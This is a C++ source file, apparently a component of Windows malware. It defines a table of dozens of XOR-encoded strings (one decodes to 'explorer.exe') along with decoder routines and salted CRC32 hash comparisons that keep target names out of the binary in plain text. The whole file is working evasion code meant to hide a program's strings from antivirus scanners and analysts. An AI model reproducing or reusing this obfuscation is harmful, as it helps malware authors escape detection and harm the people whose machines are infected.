#include <windows.h>

#include "defines.h"
#include "cryptedstrings.h"

#include "..\common\str.h"
#include "..\common\mem.h"
#include "..\common\crypt.h"

//?????? ?????.
static const CryptedStrings::STRINGINFO strings[] =
{
//STRINGS_DATA_BEGIN
	{ 125,   12, "\x18\x04\x0F\x12\x16\x0A\x1E\x08\x5B\x11\x0F\x13"},
	{ 239,   16, "\xAB\x87\x8A\x85\x9F\x8B\x85\xB8\x95\x89\x81\x91\x80\x96\xA8\x84"},
	{  44,   85, "\x59\x5E\x4B\x5D\x77\x59\x58\x4E\x42\x0D\x04\x45\x52\x4E\x55\x50\x59\x4F\x10\x4C\x4C\x58\x48\x4F\x41\x45\x18\x5F\x5F\x5C\x57\x43\x6D\x6A\x6B\x2D\x24\x29\x28\x2E\x77\x27\x2F\x3C\x0D\x0B\x77\x70\x79\x6F\x41\x6F\x6A\x7C\x7C\x33\x36\x77\x64\x78\x67\x62\x77\x61\x42\x1E\x1A\x0E\x1A\x1D\x1F\x1B\x4A\x15\x07\x00\x05\x43\x4E\x43\x4D\x54\x45\x72\x72"},
	{ 136,    9, "\xD8\xFB\xE5\xED\xE5\xE1\xEB\xAA\xF5"},
	{ 168,   16, "\xF8\xDB\xC5\xCD\xC5\xC1\xCB\xE6\xCD\xC0\xC5\xC6\xF4\xC4\xD2\xCF"},
	{   2,    7, "\x47\x6D\x61\x63\x6A\x62\x60"},
	{ 131,    9, "\xE2\xEC\xEE\xEE\xFE\xEB\xEA\xF1\xF8"},
	{  25,   11, "\x49\x4A\x44\x5D\x78\x68\x5A\x6C\x63\x7F\x61"},
	{  28,    8, "\x4C\x4F\x41\x5C\x74\x76\x69\x7E"},
	{ 180,   21, "\xE4\xE7\xE9\xF0\xD5\xC5\xFC\xD2\xD1\xD8\xF8\xD0\xCA\xF0\xDE\xDE\xCA\xD1\xCF\xD3\xD9"},
	{ 129,   10, "\xE8\xED\xE2\xE5\xE0\xAB\xED\xF6\xEC\xEF"},
	{  20,   33, "\x75\x65\x66\x7B\x79\x72\x73\x67\x75\x72\x70\x30\x60\x34\x6D\x6C\x73\x28\x60\x68\x72\x6C\x2F\x76\x7E\x61\x6B\x61\x6B\x66\x6E\x6E\x50"},
	{ 112,   11, "\x16\x18\x00\x16\x12\x1A\x0E\x59\x1D\x01\x1F"},
	{ 102,   20, "\x2F\x01\x49\x28\x0D\x07\x09\x07\x07\x0A\x08\x40\x39\x02\x06\x0A\x13\x4D\x79\x7F"},
	{ 118,   11, "\x53\x04\x2B\x50\x42\x4B\x28\x54\x4E\x47\x24"},
	{  75,   50, "\x03\x1E\x1D\x18\x6F\x2F\x38\x38\x2B\x27\x2F\x34\x2E\x25\x24\x30\x32\x35\x37\x62\x7F\x2B\x2E\x39\x21\x3C\x30\x3D\x32\x6B\x77\x71\x18\x48\x45\x48\x1F\x0F\x1E\x1F\x14\x0D\x13\x04\x5A\x44\x40\x17\x59\x70"},
	{ 244,    4, "\xDA\x91\x9A\x9B"},
	{ 177,    3, "\x9F\xD7\xC9"},
	{  28,    8, "\x72\x6E\x6D\x2C\x36\x7D\x76\x77"},
	{ 183,    7, "\xE7\xE4\xEA\xE6\xD6\xD3\xD5"},
	{  63,    3, "\x59\x4A\x4D"},
	{ 214,    9, "\x93\xB9\xB5\xB7\xBE\xB6\xB4\x87\xE6"},
	{  41,    7, "\x5C\x46\x40\x44\x42\x5B\x41"},
	{   4,   44, "\x21\x76\x0C\x55\x65\x67\x67\x71\x69\x7F\x34\x2F\x2D\x5A\x00\x2E\x67\x45\x59\x44\x44\x31\x76\x72\x68\x7C\x24\x15\x4D\x6A\x7F\x69\x6D\x4B\x56\x52\x54\x1B\x07\x50\x26\x27\x0B\x7C"},
	{ 210,  326, "\xA7\xA0\xB5\xA3\x89\xA7\xA6\xB0\xBC\xF3\xFA\xB7\xBB\xAB\xAB\xB2\xB0\xA8\xEE\xA2\xA9\xA8\xAF\xAC\xAF\xE5\xAB\xA6\xA1\xA4\xA5\xA8\xB0\x96\x98\x90\x80\x9E\x9B\x87\xD8\xD7\xD8\xC9\xD7\xC4\xF1\xF7\x97\x90\x85\x93\xB9\x97\x96\x80\x8C\xC3\xCA\x99\x9C\x86\x9A\x8C\xF1\xEA\xBE\xF2\xFA\xF2\xF5\xE7\xD5\xF5\xCB\xF1\xEB\xEB\xF8\xF2\xF5\xED\xAE\xE2\xE9\xE8\xEF\xEC\xEF\xF8\xAA\xA5\xAE\xE9\xED\xE1\xC1\xD6\x99\x8A\xBB\xBD\xC1\xC6\xDF\xC9\xE7\xC9\xCC\xDA\xDA\x95\x80\xD0\xC5\xC2\xD3\xD5\xCD\xD1\xD3\x85\xDF\xC8\xDC\xC1\xF3\xDB\x3B\x36\x27\x38\x38\x30\x0B\x38\x33\x23\x3D\x3D\x7C\x73\x7C\x3B\x23\x2F\x33\x24\x6F\x7C\x49\x4F\x3F\x38\x2D\x3B\x11\x3F\x3E\x28\x14\x5B\x52\x02\x13\x14\x01\x07\x13\x0F\x01\x57\x09\x1E\x0E\x13\x3D\x15\x09\x04\x11\x0E\x0A\x02\x35\x06\x01\x11\x0B\x0B\x42\x1E\x7A\x7C\x67\x4E\x79\x79\x77\x70\x38\x37\x38\x7F\x7F\x73\x6F\x78\x2B\x38\x0D\x0B\x73\x74\x61\x77\x55\x7B\x7A\x6C\x68\x27\x2E\x7E\x57\x50\x45\x43\x5F\x43\x4D\x1B\x4D\x5A\x4A\x57\x61\x4C\x49\x5F\x4F\x4A\x54\x7E\x4F\x49\x57\x40\x49\x5E\x5A\x4C\x0C\x03\x0C\x4B\xB3\xBF\xA3\xB4\xFF\xEC\xD9\xDF\xAF\xA8\xBD\xAB\x81\xAF\xAE\xB8\xA4\xEB\xE2\xB2\xA3\xA4\xB1\xB7\xA3\xBF\xB1\xE7\xB9\xAE\xBE\xA3\xAD\x80\x85\x93\x9B\x9E\x80\xAA\x93\x95\x8B\x9C\x9D\x8A\x8E\x98\xCC\x90\x88\x8E\x91\xB8\x8B\x8B\x89\x8E\xCA\xC5\xCE\x89\x8D\x81\xE1\xF6\xB9\xAA\x9B\x9D"},
	{ 158,    9, "\xF7\xF2\xFD\xFA\xFF\xB4\xE8\xF7\xF1"},
	{  95,    7, "\x0F\x0C\x02\x0C\x34\x36\x35"},
	{ 122,   34, "\x32\x2F\x2C\x29\x5E\x1E\x09\x09\x1A\x16\x1E\x05\x1F\x14\x15\x01\x03\x04\x06\x49\x46\x0A\x02\x0E\x0D\x07\x05\x05\x4F\x5D\x44\x40\x09\x51"},
	{ 170,   30, "\xE3\xC5\xDC\xCC\xDC\xC1\xC9\xD9\x82\xE6\xD8\xD1\xCA\xC8\xD6\xC0\xC8\xE7\xD1\xDC\xC6\xCF\xD0\xD2\xC0\xD6\x9E\xD4\xCE\xD2"},
	{   3,    7, "\x76\x6C\x6A\x6E\x68\x71\x6B"},
	{  83,   14, "\x14\x37\x25\x00\x25\x39\x36\x15\x3F\x3E\x2B\x3D\x2C\x2D"},
	{  53,   15, "\x78\x5B\x4D\x5F\x5D\x5C\x52\x6E\x7B\x55\x4D\x5B\x5F\x57\x43"},
	{  90,   28, "\x29\x38\x2A\x3C\x3B\x31\x2F\x35\x3D\x27\x23\x0D\x73\x24\x08\x70\x7A\x7F\x30\x16\x6B\x7F\x74\x35\x6C\x29\x30\x26"},
	{  16,   10, "\x59\x62\x40\x76\x78\x74\x62\x7E\x6E\x7C"},
	{ 199,    9, "\xAE\xAB\xA4\xA3\xA6\xED\xA6\xA9\xA9"},
	{  20,   38, "\x53\x7A\x79\x70\x7C\x74\x4E\x4F\x5F\x75\x6C\x70\x75\x7C\x46\x47\x45\x75\x76\x6B\x69\x62\x63\x77\x65\x62\x60\x53\x6B\x61\x78\x64\x59\x50\x18\x52\x48\x54"},
	{ 141,   29, "\xEA\xFE\xEE\xEC\xEB\xED\xEF\xD6\xA0\xD7\xD8\xA3\xB1\xB2\xF6\xDD\xB8\xAC\xAD\xEB\xC6\xBD\xAB\xA8\xE0\xBA\xE3\xEE\xE5"},
	{ 140,   14, "\xA9\xFE\xB4\xA0\xA7\xAC\xF9\xB1\xA1\xF6\xC6\xA2\xF3\xAE"},
	{  99,   16, "\x33\x30\x3E\x2F\x17\x03\x0B\x30\x28\x3A\x3A\x07\x0C\x05\x08\x18"},
	{  45,   11, "\x7D\x7E\x70\x7D\x4C\x5C\x6E\x58\x57\x4B\x55"},
	{ 206,    5, "\x9A\x8A\xF6\xC0\xC0"},
	{  56,    9, "\x56\x4A\x4A\x49\x08\x13\x5A\x53\x5C"},
	{ 127,   18, "\x3C\x11\x13\x08\x1E\x14\x0D\x55\x23\x0F\x05\x11\x49\x52\x54\x03\x62\x64"},
	{ 207,    3, "\xBF\xA0\xAA"},
	{  48,    3, "\x7C\x5E\x45"},
	{  93,    3, "\x3A\x35\x39"},
	{ 248,   27, "\xB5\x96\x80\x92\x90\x91\x9F\xDF\xB6\x98\x80\x96\x92\x9A\x8E\xAB\x8E\x80\x98\x8E\x8A\x82\x96\xC1\x85\x99\x87"},
	{   9,   11, "\x6F\x69\x7F\x6B\x61\x53\x6A\x7C\x73\x6F\x71"},
	{  81,    4, "\x3B\x20\x36\x35"},
	{  47,   27, "\x6E\x4D\x4E\x49\x5B\x5E\x04\x6D\x49\x45\x4A\x40\x4A\x4C\x46\x1A\x1F\x57\x59\x59\x55\x4E\x50\x4C\x4E\x3B\x3F"},
	{ 201,   44, "\x9A\x87\x8D\x9E\x9A\x8D\x9D\x8B\x9D\x8D\xAA\xA1\xB7\xAB\xB4\xA9\xBF\xAC\x87\x8D\xB4\xB2\xBB\xB1\xA6\xA3\xF3\x9C\x81\x88\x94\xA3\x9B\x9A\x8E\x84\x99\xBA\x8A\x9C\x92\x89\x8C\x8C"},
	{ 166,    9, "\xDE\xD7\xC7\xCA\xCF\x8D\xC4\xCD\xC2"},
	{ 213,    7, "\xA0\xA7\xB2\xA4\xFF\xBA\xA0"},
	{  51,    4, "\x54\x48\x58\x40"},
	{ 127,   12, "\x0F\x0C\x12\x1A\x12\x16\x1C\x0B\x59\x1F\x1B\x1D"},
	{  61,   25, "\x7A\x4E\x5E\x5C\x5B\x5D\x5F\x1A\x51\x55\x43\x57\x11\x56\x41\x5D\x40\x16\x0F\x0B\x5A\x22\x21\x0F\x76"},
	{  11,   12, "\x62\x6F\x71\x78\x63\x61\x7F\x69\x2D\x67\x79\x65"},
	{ 233,    9, "\xAC\x86\x8A\x88\x81\x89\x8B\xB8\xD8"},
	{   2,    4, "\x72\x6C\x70\x32"},
	{ 124,   51, "\x2F\x12\x18\x0B\x0F\x18\x08\x1E\x28\x38\x1F\x14\x02\x1E\x01\x1C\x0A\x19\x32\x26\x06\x1D\x0F\x19\x0A\x00\x12\x47\x25\x19\x12\x0F\x33\x2F\x3B\x2D\x04\x09\x32\x32\x27\x3D\x3F\x39\x37\x17\x3B\x3F\x38\x28\x3C"},
	{ 147,    8, "\xC3\xC0\xCE\xC7\xE5\xFF\xE1\xF1"},
	{ 154,   13, "\xF9\xFA\xE8\xED\xFD\xF7\xFD\xC2\xB7\xF7\xBE\xB4\xE5"},
	{  53,    4, "\x65\x55\x43\x5E"},
	{  77,   12, "\x01\x23\x2E\x2A\x05\x21\x29\x38\x24\x36\x3E\x07"},
	{  79,   59, "\x1C\x01\x0B\x18\x1C\x0B\x1B\x0D\x1B\x0B\x2C\x27\x31\x2D\x32\x2F\x39\x2A\x01\x0B\x32\x34\x3D\x37\x20\x25\x75\x1A\x07\x0E\x12\x25\x1D\x1C\x08\x02\x1F\x3C\x0C\x1A\x14\x0F\x0A\x0A\x3F\x32\x13\x0F\x19\x17\x11\x19\x37\x13\x0A\x0C\x2B\x53\x06"},
	{ 112,   11, "\x39\x1F\x01\x07\x15\x19\x1A\x33\x19\x0D\x1F"},
	{   0,    0, NULL}
//STRINGS_DATA_END
};

void CryptedStrings::init(void)
{

}

void CryptedStrings::uninit(void)
{

}

void CryptedStrings::_getA(WORD id, LPSTR buffer)
{
	  STRINGINFO *s = (CryptedStrings::STRINGINFO *)&strings[id];
	  for(unsigned short i = 0; i < s->size; i++)
		  buffer[i] = (s->encodedString[i] ^ s->key) ^ i;
	  buffer[s->size] = 0;
}

void CryptedStrings::_getW(WORD id, LPWSTR buffer)
{
	  STRINGINFO *s = (CryptedStrings::STRINGINFO *)&strings[id];
	  for(unsigned short i = 0; i < s->size; i++)
		  buffer[i] = ((s->encodedString[i] ^ s->key) ^ i) & 0xff;
	  buffer[s->size] = 0;
}

bool CryptedStrings::_cmpW(DWORD hash, LPWSTR string, int length)
{
	if(length == 0 || (string == NULL && length == -1))
		return hash == 0;

	if(string == NULL)	// should be error
		return false;

	if(length == -1)
		length = Str::_LengthW(string);
	return (Crypt::crc32Hash(string, length * sizeof(WCHAR)) ^ CRC_RAND) == hash;
}

bool CryptedStrings::_cmpA(DWORD hash, LPSTR string, int length)
{
	if(length == 0 || (string == NULL && length == -1))
		return hash == 0;

	if(string == NULL)	// should be error
		return false;

	if(length == -1)
		length = Str::_LengthA(string);
	LPWSTR wstr = Str::_ansiToUnicodeEx(string, length);
	bool bResult = (Crypt::crc32Hash(wstr, length * sizeof(WCHAR)) ^ CRC_RAND) == hash;
	Mem::free(wstr);
	return bResult;
}

bool CryptedStrings::_cmpiW(DWORD hash, LPWSTR string, int length)
{
	if(length == 0 || (string == NULL && length == -1))
		return hash == 0;

	if(string == NULL)	// should be error
		return false;

	if(length == -1)
		length = Str::_LengthW(string);
	LPWSTR cstr = Str::_CopyExW(string, length);
	CWA(user32, CharLowerW(cstr));

	bool bResult = (Crypt::crc32Hash(cstr, length * sizeof(WCHAR)) ^ CRC_RAND) == hash;
	
	Mem::free(cstr);

	return bResult;
}

bool CryptedStrings::_cmpiA(DWORD hash, LPSTR string, int length)
{
	if(length == 0 || (string == NULL && length == -1))
		return hash == 0;

	if(string == NULL)	// should be error
		return false;

	if(length == -1)
		length = Str::_LengthA(string);
	LPWSTR wstr = Str::_ansiToUnicodeEx(string, length);
	CWA(user32, CharLowerW(wstr));
	bool bResult = (Crypt::crc32Hash(wstr, length * sizeof(WCHAR)) ^ CRC_RAND) == hash;
	Mem::free(wstr);
	return bResult;
}
